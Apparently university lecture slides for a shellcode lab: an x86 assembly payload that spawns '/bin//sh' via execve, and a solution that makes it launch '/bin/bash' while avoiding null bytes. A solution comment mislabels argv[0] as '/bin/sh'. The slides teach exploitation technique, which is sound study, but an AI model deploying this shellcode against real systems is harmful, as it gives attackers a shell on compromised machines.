#import "@preview/polylux:0.3.1": *
#import "unipd.typ": *

#new-section[ Task 1.b ]

#slide[
  #let code = text(size: 18pt, ```asm
    ; Store the argument string on stack
    xor  eax, eax 
    push eax          ; Use 0 to terminate the string
    push "//sh"
    push "/bin"
    mov  ebx, esp     ; Get the string address

    ; Construct the argument array argv[]
    push eax          ; argv[1] = 0
    push ebx          ; argv[0] points "/bin//sh"
    mov  ecx, esp     ; Get the address of argv[]
  
    ; For environment variable 
    xor  edx, edx     ; No env variables 

    ; Invoke execve()
    xor  eax, eax     ; eax = 0x00000000
    mov   al, 0x0b    ; eax = 0x0000000b
    int 0x80
  ```)

  #let task = [
    - The code executes the `/bin//sh` binary (same as `/bin/sh`)

    - Change it to execute the `/bin/bash` binary

    - Avoid using double slashes (`//`)

    #v(15%)
  ]

  #place(dx: 62%, dy: 30%, box(width: 35%, task))
  #code
]

#new-section[ Task 1.b: Solution ]

#slide[
  #let code = text(size: 18pt, ```asm
    ; Store the argument string on stack
    mov  eax, "###h"
    shr  eax, 24
    push eax          ; Push "h\x00\x00\x00" to the stack
    push "/bas"
    push "/bin"
    mov  ebx, esp     ; Get the string address

    ; Construct the argument array argv[]
    xor  eax, eax
    push eax          ; argv[1] = 0
    push ebx          ; argv[0] = "/bin/sh\0"
    mov  ecx, esp     ; Get the address of argv[]
  
    ; For environment variable 
    xor  edx, edx     ; No env variables 

    ; Invoke execve()
    xor  eax, eax     ; eax = 0x00000000
    mov   al, 0x0b    ; eax = 0x0000000b
    int 0x80
  ```)

  #let notes = [
    - `"###h"` is equivalent to the integer `0x68232323`

    - Shifting right by 24 gives us `0x00000068`

    - Which is `"h\x00\x00\x00"`
  ]

  #place(dx: 60%, dy: 40%, box(width: 40%, notes))
  #code
]

// TODO: Show stack?

#slide[
  TODO: Show shell
]

#slide[
  TODO: Show bytes
]
